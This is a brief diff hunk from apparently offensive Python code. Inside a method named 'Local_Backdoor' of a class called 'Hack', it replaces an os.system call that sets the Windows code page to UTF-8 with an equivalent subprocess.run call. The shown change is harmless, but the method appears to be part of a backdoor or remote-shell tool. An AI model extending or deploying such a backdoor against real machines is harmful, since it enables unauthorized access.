@@ -124,7 +124,7 @@ class Hack(object):
     @staticmethod
     def Local_Backdoor(host, port, buffer=4096):
         try:
-            os.system("chcp 65001")
+            NO_USE = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE)
         except:
              pass
 
